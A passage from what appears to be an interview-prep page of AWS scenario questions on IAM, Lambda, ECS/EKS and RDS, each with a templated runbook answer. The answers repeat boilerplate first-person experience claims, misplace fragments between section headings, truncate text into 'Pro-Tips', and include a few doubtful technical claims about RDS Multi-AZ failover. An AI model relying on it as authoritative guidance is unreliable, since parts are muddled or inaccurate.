- Instance running the app — is the application actually running on that port? netstat -tlnp | grep .

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-37-aws-q21-a-lambda-function-is-failing-with-access-denied-when-trying-to-write-to-dynamodb-how-do-you-fix-it-l2"></a>
### 37. AWS Q21: A Lambda function is failing with Access Denied when trying to write to DynamoDB How do you fix it [L2]

**Level:** `Senior DevOps / SRE [L2]` | **Category:** `AWS` • `IAM & Security` | **Type:** `Production Scenario [L2]`

**Tags:** `AWS` `IAM & Security` `L2` `Cloud` `Infrastructure`

> **Interview Question:**  
> *"A Lambda function is failing with `Access Denied` when trying to write to DynamoDB. How do you fix it?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"In our AWS cloud environment, we managed high-traffic microservices where this exact scenario occurred. When addressing this question, I walk the interviewer through our production incident runbook: isolating the blast radius, checking diagnostic logs and metrics, and applying a safe fix."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Initial Diagnostics & Root Cause Analysis

Lambda functions use an **execution role** (IAM role). This role needs `dynamodb:PutItem` (or broader `dynamodb:*`) permission on the target table.

- Go to Lambda → Configuration → Permissions → click the execution role name.
- In IAM, add an inline policy or attach a managed policy with DynamoDB permissions.

##### 2️⃣ Remediation & Permanent Safeguards

Fix: Example policy: Always scope the Resource to the specific table ARN, not `*`. Principle of least privilege. ---

```json
{
  "Effect": "Allow",
  "Action": ["dynamodb:PutItem", "dynamodb:GetItem"],
  "Resource": "arn:aws:dynamodb:us-east-1:123456789:table/MyTable"
}
```

#### 🎯 Key Architectural Takeaway
> Pro-Tip: Go to Lambda → Configuration → Permissions → click the execution role name..

#### ⏱️ 60-Second Elevator Pitch Summary

- Go to Lambda → Configuration → Permissions → click the execution role name.
- In IAM, add an inline policy or attach a managed policy with DynamoDB permissions.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-38-aws-q22-you-need-to-give-a-third-party-vendor-access-to-a-specific-s3-bucket-without-giving-them-aws-credentials-how-l2"></a>
### 38. AWS Q22: You need to give a third-party vendor access to a specific S3 bucket without giving them AWS credentials How [L2]

**Level:** `Senior DevOps / SRE [L2]` | **Category:** `AWS` • `IAM & Security` | **Type:** `Production Scenario [L2]`

**Tags:** `AWS` `IAM & Security` `L2` `Cloud` `Infrastructure`

> **Interview Question:**  
> *"You need to give a third-party vendor access to a specific S3 bucket without giving them AWS credentials. How?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"When an interviewer asks how I troubleshoot this in AWS, I frame it through my hands-on production experience. When addressing this question, I walk the interviewer through our production incident runbook: isolating the blast radius, checking diagnostic logs and metrics, and applying a safe fix."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Initial Diagnostics & Root Cause Analysis

Use **IAM Cross-Account Role Assumption**:

- In your AWS account, create an IAM role with S3 permissions on the bucket.
- Set the trust policy to allow the vendor's AWS account ID to assume the role.
- The vendor calls `sts:AssumeRole` from their account and gets temporary credentials.
- They use those credentials to access only what the role allows.

##### 2️⃣ Remediation & Permanent Safeguards

Benefits: Alternatively for simpler cases: create an IAM user with programmatic access (access key/secret) scoped only to that bucket. Less ideal — long-term credentials. ---

- No long-term credentials shared.
- You can revoke access instantly by deleting the role.
- All access is auditable in CloudTrail.

#### 🎯 Key Architectural Takeaway
> Pro-Tip: In your AWS account, create an IAM role with S3 permissions on the bucket..

#### ⏱️ 60-Second Elevator Pitch Summary

- In your AWS account, create an IAM role with S3 permissions on the bucket.
- Set the trust policy to allow the vendor's AWS account ID to assume the role.
- The vendor calls sts:AssumeRole from their account and gets temporary credentials.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-39-aws-q23-you-discover-that-an-iam-access-key-was-accidentally-committed-to-a-public-github-repository-what-do-you-do-immediately-l3"></a>
### 39. AWS Q23: You discover that an IAM access key was accidentally committed to a public GitHub repository What do you do immediately [L3]

**Level:** `Staff SRE / Principal Architect [L3]` | **Category:** `AWS` • `IAM & Security` | **Type:** `Staff SRE Scenario [L3]`

**Tags:** `AWS` `IAM & Security` `L3` `Cloud` `Infrastructure`

> **Interview Question:**  
> *"You discover that an IAM access key was accidentally committed to a public GitHub repository. What do you do immediately?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"In a previous role, our monitoring paged me for a similar incident across our AWS VPC infrastructure. When addressing this question, I walk the interviewer through our production incident runbook: isolating the blast radius, checking diagnostic logs and metrics, and applying a safe fix."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Initial Diagnostics & Root Cause Analysis

This is a security incident. Move fast — bots scan GitHub and abuse leaked keys within minutes.

- **Immediately deactivate the key** — IAM console → Users → find the user → Security credentials → Deactivate the access key.
- **Create a new key if needed** for the application.
- **Check CloudTrail** — `aws cloudtrail lookup-events --lookup-attributes AttributeKey=AccessKeyId,AttributeValue=` — see what the key was used for, including any unauthorized usage.
- **Assess the blast radius** — what permissions did that user have? Audit anything that was changed.
- **Rotate any other credentials** the user/app might have touched (DB passwords, etc.).

##### 2️⃣ Remediation & Permanent Safeguards

---

- **Delete the key** after deactivating and confirming the new key is working.
- **Remove the commit from GitHub** (history) and notify the GitHub security team if sensitive data was exposed.
- **Post-incident** — implement pre-commit hooks (ShieldCommit!) to prevent future secret leaks.

#### 🎯 Key Architectural Takeaway
> Pro-Tip: Immediately deactivate the key — IAM console → Users → find the user → Security credentials → Deactivate the access key..

#### ⏱️ 60-Second Elevator Pitch Summary

- Immediately deactivate the key — IAM console → Users → find the user → Security credentials → Dea...
- Create a new key if needed for the application.
- Check CloudTrail — aws cloudtrail lookup-events --lookup-attributes AttributeKey=AccessKeyId,Attr...

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-40-aws-q24-what-is-the-difference-between-an-iam-policy-attached-to-a-user-vs-a-resource-policy-attached-to-an-s3-bucket-l2"></a>
### 40. AWS Q24: What is the difference between an IAM policy attached to a user vs a resource policy attached to an S3 bucket [L2]

**Level:** `Senior DevOps / SRE [L2]` | **Category:** `AWS` • `IAM & Security` | **Type:** `Production Scenario [L2]`

**Tags:** `AWS` `IAM & Security` `L2` `Cloud` `Infrastructure`

> **Interview Question:**  
> *"What is the difference between an IAM policy attached to a user vs a resource policy attached to an S3 bucket?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"AWS reliability requires differentiating between AWS control plane limits and host-level resource exhaustion. When addressing this question, I walk the interviewer through our production incident runbook: isolating the blast radius, checking diagnostic logs and metrics, and applying a safe fix."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Initial Diagnostics & Root Cause Analysis

Example: An S3 bucket policy can grant access to an IAM user in a **different AWS account** — the identity policy alone can't cross account boundaries without a resource policy (or role trust policy) on the other side.

- **Identity policy** (attached to IAM user/role/group) — defines what that identity CAN do across AWS.
- **Resource policy** (attached to S3 bucket, KMS key, SNS topic) — defines WHO can access that specific resource.

##### 2️⃣ Remediation & Permanent Safeguards

When both exist: for same-account access, the **union of both** policies is the effective permission. For cross-account: **both must allow** the action. Explicit Deny anywhere always wins, regardless of Allows. ---

#### 🎯 Key Architectural Takeaway
> Pro-Tip: Identity policy (attached to IAM user/role/group) — defines what that identity CAN do across AWS..

#### ⏱️ 60-Second Elevator Pitch Summary

- Identity policy (attached to IAM user/role/group) — defines what that identity CAN do across AWS.
- Resource policy (attached to S3 bucket, KMS key, SNS topic) — defines WHO can access that specifi...

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-41-aws-q25-explain-how-iam-permission-boundaries-work-and-give-a-use-case-l3"></a>
### 41. AWS Q25: Explain how IAM permission boundaries work and give a use case [L3]

**Level:** `Staff SRE / Principal Architect [L3]` | **Category:** `AWS` • `IAM & Security` | **Type:** `Staff SRE Scenario [L3]`

**Tags:** `AWS` `IAM & Security` `L3` `Cloud` `Infrastructure`

> **Interview Question:**  
> *"Explain how IAM permission boundaries work and give a use case."*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"In our AWS cloud environment, we managed high-traffic microservices where this exact scenario occurred. When addressing this question, I walk the interviewer through our production incident runbook: isolating the blast radius, checking diagnostic logs and metrics, and applying a safe fix."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Initial Diagnostics & Root Cause Analysis

A **permission boundary** is a policy attached to an IAM entity that sets the maximum permissions the entity can ever have — even if an identity policy grants more.

- You want to allow developers to create their own IAM roles for their Lambda functions.
- But you don't want them to create roles with admin access (privilege escalation risk).
- Solution: require all roles created by developers to have a permission boundary that limits them to a safe set of actions.

##### 2️⃣ Remediation & Permanent Safeguards

Effective permissions = intersection of identity policy AND permission boundary. Use case — delegated administration: This is a key pattern for secure self-service IAM in large organizations. --- ## 🔵 ECS, EKS, Lambda ---

- The developer has `iam:CreateRole` permission but also the condition that the new role must have a specific boundary attached.

#### 🎯 Key Architectural Takeaway
> Pro-Tip: You want to allow developers to create their own IAM roles for their Lambda functions..

#### ⏱️ 60-Second Elevator Pitch Summary

- You want to allow developers to create their own IAM roles for their Lambda functions.
- But you don't want them to create roles with admin access (privilege escalation risk).
- Solution: require all roles created by developers to have a permission boundary that limits them ...

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-42-aws-q26-what-is-the-difference-between-ecs-with-ec2-launch-type-and-ecs-with-fargate-l2"></a>
### 42. AWS Q26: What is the difference between ECS with EC2 launch type and ECS with Fargate [L2]

**Level:** `Senior DevOps / SRE [L2]` | **Category:** `AWS` • `ECS, EKS, Lambda` | **Type:** `Production Scenario [L2]`

**Tags:** `AWS` `ECS, EKS, Lambda` `L2` `Cloud` `Infrastructure`

> **Interview Question:**  
> *"What is the difference between ECS with EC2 launch type and ECS with Fargate?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"When an interviewer asks how I troubleshoot this in AWS, I frame it through my hands-on production experience. When addressing this question, I walk the interviewer through our production incident runbook: isolating the blast radius, checking diagnostic logs and metrics, and applying a safe fix."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Initial Diagnostics & Root Cause Analysis

Choose EC2 when you need GPU containers, custom AMIs, network performance tuning, or cost optimization at scale. Choose Fargate for simplicity, small teams, or variable workloads.

- **EC2 launch type** — you manage the EC2 instances (the container hosts). You're responsible for patching, scaling the cluster, choosing instance types. More control and potentially cheaper at scale.
- **Fargate** — serverless containers. AWS manages the underlying infrastructure. You just define CPU/memory per task. No instances to manage. Faster to set up. More expensive per unit of compute but no over-provisioning waste.

##### 2️⃣ Remediation & Permanent Safeguards

---

#### 🎯 Key Architectural Takeaway
> Pro-Tip: EC2 launch type — you manage the EC2 instances (the container hosts). You're responsible for patching, scaling the cluster, choosi.

#### ⏱️ 60-Second Elevator Pitch Summary

- EC2 launch type — you manage the EC2 instances (the container hosts). You're responsible for patc...
- Fargate — serverless containers. AWS manages the underlying infrastructure. You just define CPU/m...

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-43-aws-q27-your-ecs-task-keeps-stopping-with-exit-code-137-whats-happening-l2"></a>
### 43. AWS Q27: Your ECS task keeps stopping with exit code 137 Whats happening [L2]

**Level:** `Senior DevOps / SRE [L2]` | **Category:** `AWS` • `ECS, EKS, Lambda` | **Type:** `Production Scenario [L2]`

**Tags:** `AWS` `ECS, EKS, Lambda` `L2` `Cloud` `Infrastructure`

> **Interview Question:**  
> *"Your ECS task keeps stopping with exit code 137. What's happening?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"In a previous role, our monitoring paged me for a similar incident across our AWS VPC infrastructure. When addressing this question, I walk the interviewer through our production incident runbook: isolating the blast radius, checking diagnostic logs and metrics, and applying a safe fix."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Initial Diagnostics & Root Cause Analysis

Exit code 137 = container killed by OOM (Out of Memory) — `128 + 9 (SIGKILL)`.

- Check task definition memory hard/soft limit.
- Increase the memory limit.
- Or find and fix the memory leak in your application.

##### 2️⃣ Remediation & Permanent Safeguards

The container exceeded its memory limit and was killed. Fix: ---

- Use CloudWatch Container Insights to monitor actual memory usage trends.

#### 🎯 Key Architectural Takeaway
> Pro-Tip: Check task definition memory hard/soft limit..

#### ⏱️ 60-Second Elevator Pitch Summary

- Check task definition memory hard/soft limit.
- Increase the memory limit.
- Or find and fix the memory leak in your application.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-44-aws-q28-a-lambda-function-times-out-on-every-invocation-what-could-be-the-cause-l2"></a>
### 44. AWS Q28: A Lambda function times out on every invocation What could be the cause [L2]

**Level:** `Senior DevOps / SRE [L2]` | **Category:** `AWS` • `ECS, EKS, Lambda` | **Type:** `Production Scenario [L2]`

**Tags:** `AWS` `ECS, EKS, Lambda` `L2` `Cloud` `Infrastructure`

> **Interview Question:**  
> *"A Lambda function times out on every invocation. What could be the cause?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"AWS reliability requires differentiating between AWS control plane limits and host-level resource exhaustion. When addressing this question, I walk the interviewer through our production incident runbook: isolating the blast radius, checking diagnostic logs and metrics, and applying a safe fix."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Initial Diagnostics & Root Cause Analysis

---

- **Timeout too short** — default is 3 seconds. If the function takes 5 seconds, increase the timeout (up to 15 minutes).
- **Waiting on external resources** — DB connection takes too long, external HTTP call is slow, S3 download is large.
- **Cold start latency** — VPC Lambda cold starts can add 5-10 seconds for ENI provisioning. Use provisioned concurrency for latency-sensitive functions.
- **VPC connectivity issue** — Lambda in VPC can't reach the internet or RDS because of missing NAT Gateway or incorrect Security Group rules.

##### 2️⃣ Remediation & Permanent Safeguards

Execute the resolution runbook and verify workload health:

- **Infinite loop or deadlock** — the function logic has a bug that never resolves.
- **DB connection pool exhausted** — Lambda opens a new DB connection per invocation. With high concurrency, you exhaust DB connections. Use RDS Proxy to pool connections.

#### 🎯 Key Architectural Takeaway
> Pro-Tip: Timeout too short — default is 3 seconds. If the function takes 5 seconds, increase the timeout (up to 15 minutes)..

#### ⏱️ 60-Second Elevator Pitch Summary

- Timeout too short — default is 3 seconds. If the function takes 5 seconds, increase the timeout (...
- Waiting on external resources — DB connection takes too long, external HTTP call is slow, S3 down...
- Cold start latency — VPC Lambda cold starts can add 5-10 seconds for ENI provisioning. Use provis...

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-45-aws-q29-you-have-a-lambda-function-thats-running-fine-at-10-invocations-second-but-fails-at-1000-second-with-throttling-errors-how-do-you-handle-this-l3"></a>
### 45. AWS Q29: You have a Lambda function thats running fine at 10 invocations/second but fails at 1000/second with throttling errors How do you handle this [L3]

**Level:** `Staff SRE / Principal Architect [L3]` | **Category:** `AWS` • `ECS, EKS, Lambda` | **Type:** `Staff SRE Scenario [L3]`

**Tags:** `AWS` `ECS, EKS, Lambda` `L3` `Cloud` `Infrastructure`

> **Interview Question:**  
> *"You have a Lambda function that's running fine at 10 invocations/second but fails at 1000/second with throttling errors. How do you handle this?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"In our AWS cloud environment, we managed high-traffic microservices where this exact scenario occurred. When addressing this question, I walk the interviewer through our production incident runbook: isolating the blast radius, checking diagnostic logs and metrics, and applying a safe fix."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Initial Diagnostics & Root Cause Analysis

Lambda has a **concurrency limit** — default 1000 concurrent executions per region per account.

- **Request a concurrency limit increase** via AWS Support.
- **Reserved concurrency** — reserve a portion of the account limit for critical functions, prevent other functions from taking it all.
- **Provisioned concurrency** — pre-warm N instances of the function. No cold starts, no throttling up to that N.

##### 2️⃣ Remediation & Permanent Safeguards

At 1000 req/s with a 1-second function, you need 1000 concurrent = hitting the limit. Solutions: ---

- **Queue-based architecture** — put an SQS queue in front. Lambda reads from the queue with controlled concurrency. Requests buffer in SQS instead of being throttled.
- **Reduce function duration** — faster functions = lower concurrent execution count needed.

#### 🎯 Key Architectural Takeaway
> Pro-Tip: Request a concurrency limit increase via AWS Support..

#### ⏱️ 60-Second Elevator Pitch Summary

- Request a concurrency limit increase via AWS Support.
- Reserved concurrency — reserve a portion of the account limit for critical functions, prevent oth...
- Provisioned concurrency — pre-warm N instances of the function. No cold starts, no throttling up ...

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-46-aws-q30-explain-the-difference-between-eks-and-ecs-when-would-you-recommend-each-l3"></a>
### 46. AWS Q30: Explain the difference between EKS and ECS When would you recommend each [L3]

**Level:** `Staff SRE / Principal Architect [L3]` | **Category:** `AWS` • `ECS, EKS, Lambda` | **Type:** `Staff SRE Scenario [L3]`

**Tags:** `AWS` `ECS, EKS, Lambda` `L3` `Cloud` `Infrastructure`

> **Interview Question:**  
> *"Explain the difference between EKS and ECS. When would you recommend each?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"When an interviewer asks how I troubleshoot this in AWS, I frame it through my hands-on production experience. When addressing this question, I walk the interviewer through our production incident runbook: isolating the blast radius, checking diagnostic logs and metrics, and applying a safe fix."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Initial Diagnostics & Root Cause Analysis

**ECS (Elastic Container Service)**

- AWS-native orchestration. Simpler to operate.
- Tight integration with other AWS services (ALB, IAM, CloudWatch).
- No Kubernetes expertise required.
- Less portable (ECS is AWS-only).
- Good for teams new to containers or teams deeply invested in AWS ecosystem.
- Managed Kubernetes. Full K8s API.

##### 2️⃣ Remediation & Permanent Safeguards

**EKS (Elastic Kubernetes Service)** Recommendation: ECS for pure AWS shops wanting simplicity. EKS for Kubernetes expertise, portability, or complex scheduling needs. --- ## 🟠 RDS & Databases ---

- Portable — same manifests work on other clouds/on-prem.
- Richer ecosystem (Helm, ArgoCD, all CNCF tools).
- More complex to operate and debug.
- Good for teams with Kubernetes expertise, multi-cloud strategy, or using Kubernetes-specific features.

#### 🎯 Key Architectural Takeaway
> Pro-Tip: AWS-native orchestration. Simpler to operate..

#### ⏱️ 60-Second Elevator Pitch Summary

- AWS-native orchestration. Simpler to operate.
- Tight integration with other AWS services (ALB, IAM, CloudWatch).
- No Kubernetes expertise required.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-47-aws-q31-your-rds-instance-is-using-100-cpu-what-do-you-do-l2"></a>
### 47. AWS Q31: Your RDS instance is using 100% CPU What do you do [L2]

**Level:** `Senior DevOps / SRE [L2]` | **Category:** `AWS` • `RDS & Databases` | **Type:** `Production Scenario [L2]`

**Tags:** `AWS` `RDS & Databases` `L2` `Cloud` `Infrastructure`

> **Interview Question:**  
> *"Your RDS instance is using 100% CPU. What do you do?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"In a previous role, our monitoring paged me for a similar incident across our AWS VPC infrastructure. When addressing this question, I walk the interviewer through our production incident runbook: isolating the blast radius, checking diagnostic logs and metrics, and applying a safe fix."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Initial Diagnostics & Root Cause Analysis

---

- **Identify the culprit** — use **RDS Performance Insights** to find the top SQL queries consuming CPU.
- **Look for slow queries** — enable slow query log. Check for missing indexes.
- **Check for lock contention** — queries waiting for locks show high CPU wait.
- **Scale vertically** — stop the RDS instance, change instance class to a larger one (more CPU), restart.

##### 2️⃣ Remediation & Permanent Safeguards

Execute the resolution runbook and verify workload health:

- **Read replicas** — offload read queries to a read replica. Add a read replica and point your app's read traffic there.
- **Query optimization** — add indexes for slow queries found in Performance Insights.
- **Connection pool** — if too many connections are opening/closing rapidly, it causes CPU overhead. Use RDS Proxy.

#### 🎯 Key Architectural Takeaway
> Pro-Tip: Identify the culprit — use RDS Performance Insights to find the top SQL queries consuming CPU..

#### ⏱️ 60-Second Elevator Pitch Summary

- Identify the culprit — use RDS Performance Insights to find the top SQL queries consuming CPU.
- Look for slow queries — enable slow query log. Check for missing indexes.
- Check for lock contention — queries waiting for locks show high CPU wait.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-48-aws-q32-you-need-to-migrate-a-500gb-production-rds-database-to-a-new-region-with-minimal-downtime-how-l2"></a>
### 48. AWS Q32: You need to migrate a 500GB production RDS database to a new region with minimal downtime How [L2]

**Level:** `Senior DevOps / SRE [L2]` | **Category:** `AWS` • `RDS & Databases` | **Type:** `Production Scenario [L2]`

**Tags:** `AWS` `RDS & Databases` `L2` `Cloud` `Infrastructure`

> **Interview Question:**  
> *"You need to migrate a 500GB production RDS database to a new region with minimal downtime. How?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"AWS reliability requires differentiating between AWS control plane limits and host-level resource exhaustion. When addressing this question, I walk the interviewer through our production incident runbook: isolating the blast radius, checking diagnostic logs and metrics, and applying a safe fix."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Initial Diagnostics & Root Cause Analysis

Total downtime: a few minutes during promotion + connection string update.

- **Create a cross-region read replica** — in RDS, create a read replica in the target region. It will replicate all data and stay in sync via binlog replication (MySQL) or streaming replication (Postgres).
- **Wait for the replica to catch up** — replication lag should approach 0.
- **Maintenance window** — stop writes to the source DB (or put app in maintenance mode).
- **Promote the replica** — in the target region, promote the read replica to a standalone primary. This takes seconds.

##### 2️⃣ Remediation & Permanent Safeguards

---

- **Update app config** — point the connection string to the new region's DB endpoint.
- **Verify** — test the app against the new DB.
- **Cleanup** — once confirmed, decommission the source DB.

#### 🎯 Key Architectural Takeaway
> Pro-Tip: Create a cross-region read replica — in RDS, create a read replica in the target region. It will replicate all data and stay in sy.

#### ⏱️ 60-Second Elevator Pitch Summary

- Create a cross-region read replica — in RDS, create a read replica in the target region. It will ...
- Wait for the replica to catch up — replication lag should approach 0.
- Maintenance window — stop writes to the source DB (or put app in maintenance mode).

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-49-aws-q33-an-rds-instance-went-down-and-the-automated-failover-to-the-standby-didnt-happen-as-expected-in-a-multi-az-setup-what-could-have-gone-wrong-l3"></a>
### 49. AWS Q33: An RDS instance went down and the automated failover to the standby didnt happen as expected in a Multi-AZ setup What could have gone wrong [L3]

**Level:** `Staff SRE / Principal Architect [L3]` | **Category:** `AWS` • `RDS & Databases` | **Type:** `Staff SRE Scenario [L3]`

**Tags:** `AWS` `RDS & Databases` `L3` `Cloud` `Infrastructure`

> **Interview Question:**  
> *"An RDS instance went down and the automated failover to the standby didn't happen as expected in a Multi-AZ setup. What could have gone wrong?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"In our AWS cloud environment, we managed high-traffic microservices where this exact scenario occurred. When addressing this question, I walk the interviewer through our production incident runbook: isolating the blast radius, checking diagnostic logs and metrics, and applying a safe fix."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Initial Diagnostics & Root Cause Analysis

Multi-AZ failover is automatic, but several things can prevent or delay it:

- **Maintenance mode** — if you disabled automatic failover before maintenance.
- **Failover trigger conditions** — RDS only fails over for: storage failure, loss of network connectivity, instance hardware failure, running out of storage. It does NOT auto-failover for high CPU/load.
- **DNS propagation delay** — failover promotes the standby, but the endpoint DNS (e.g., `mydb.xxxxxx.us-east-1.rds.amazonaws.com`) needs to update. If the app uses hardcoded IPs instead of the RDS DNS endpoint, failover doesn't help. Always use DNS endpoint.

##### 2️⃣ Remediation & Permanent Safeguards

---

- **Application doesn't retry connections** — after failover, existing connections are dropped. The app must retry DB connections. Apps that don't retry see prolonged outage.
- **Replication lag** — in some edge cases, the standby might have a small lag, causing momentary data inconsistency.

#### 🎯 Key Architectural Takeaway
> Pro-Tip: Maintenance mode — if you disabled automatic failover before maintenance..

#### ⏱️ 60-Second Elevator Pitch Summary

- Maintenance mode — if you disabled automatic failover before maintenance.
- Failover trigger conditions — RDS only fails over for: storage failure, loss of network connectiv...
- DNS propagation delay — failover promotes the standby, but the endpoint DNS (e.g., mydb.xxxxxx.us...

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-50-aws-q34-your-application-connects-directly-to-rds-and-at-peak-load-you-see-too-many-connections-errors-how-do-you-fix-this-l2"></a>
### 50. AWS Q34: Your application connects directly to RDS and at peak load you see Too many connections errors How do you fix this [L2]

**Level:** `Senior DevOps / SRE [L2]` | **Category:** `AWS` • `RDS & Databases` | **Type:** `Production Scenario [L2]`

**Tags:** `AWS` `RDS & Databases` `L2` `Cloud` `Infrastructure`

> **Interview Question:**  
> *"Your application connects directly to RDS and at peak load you see `Too many connections` errors. How do you fix this?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"When an interviewer asks how I troubleshoot this in AWS, I frame it through my hands-on production experience. When addressing this question, I walk the interviewer through our production incident runbook: isolating the blast radius, checking diagnostic logs and metrics, and applying a safe fix."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Initial Diagnostics & Root Cause Analysis

Each Lambda invocation or serverless function instance opens its own DB connection. At scale, this exhausts the DB connection limit.

- Acts as a connection pooler in front of RDS.
- Lambda connects to RDS Proxy (cheap lightweight connection).
- RDS Proxy maintains a small pool of real connections to RDS and reuses them.

##### 2️⃣ Remediation & Permanent Safeguards

Fix: **Amazon RDS Proxy** For non-Lambda apps: use a connection pool library (PgBouncer for Postgres, ProxySQL for MySQL) to manage connections efficiently. Also: increase the `max_connections` DB parameter if the instance class supports it. ---

- DB sees a constant ~20 connections instead of 1000.

#### 🎯 Key Architectural Takeaway
> Pro-Tip: Acts as a connection pooler in front of RDS..

#### ⏱️ 60-Second Elevator Pitch Summary

- Acts as a connection pooler in front of RDS.
- Lambda connects to RDS Proxy (cheap lightweight connection).
- RDS Proxy maintains a small pool of real connections to RDS and reuses them.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-51-aws-q35-you-want-to-implement-a-database-backup-strategy-for-rds-that-allows-you-to-restore-to-any-point-in-the-last-7-days-how-l3"></a>
### 51. AWS Q35: You want to implement a database backup strategy for RDS that allows you to restore to any point in the last 7 days How [L3]

**Level:** `Staff SRE / Principal Architect [L3]` | **Category:** `AWS` • `RDS & Databases` | **Type:** `Staff SRE Scenario [L3]`

**Tags:** `AWS` `RDS & Databases` `L3` `Cloud` `Infrastructure`

> **Interview Question:**  
> *"You want to implement a database backup strategy for RDS that allows you to restore to any point in the last 7 days. How?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"In a previous role, our monitoring paged me for a similar incident across our AWS VPC infrastructure. When addressing this question, I walk the interviewer through our production incident runbook: isolating the blast radius, checking diagnostic logs and metrics, and applying a safe fix."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Initial Diagnostics & Root Cause Analysis

Enable **Point-In-Time Recovery (PITR)**:

- Enable automated backups on the RDS instance with `BackupRetentionPeriod: 7` (days).
- RDS takes a daily snapshot and continuously archives transaction logs (binlogs/WAL) to S3.
- This allows restore to any second within the retention window.

##### 2️⃣ Remediation & Permanent Safeguards

Restore: `aws rds restore-db-instance-to-point-in-time --target-db-instance-identifier  --restore-time 2024-01-15T14:30:00Z` This creates a NEW RDS instance (doesn't modify the original). Test the restored instance, then cut over if needed. Also: take manual snapshots before major changes (deployments, migrations). Manual snapshots don't expire with the retention period. --- ## 🟣 Monitoring & CloudWatch ---

#### 🎯 Key Architectural Takeaway
> Pro-Tip: Enable automated backups on the RDS instance with BackupRetentionPeriod: 7 (days)..

#### ⏱️ 60-Second Elevator Pitch Summary

- Enable automated backups on the RDS instance with BackupRetentionPeriod: 7 (days).
- RDS takes a daily snapshot and continuously archives transaction logs (binlogs/WAL) to S3.
- This allows restore to any second within the retention window.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

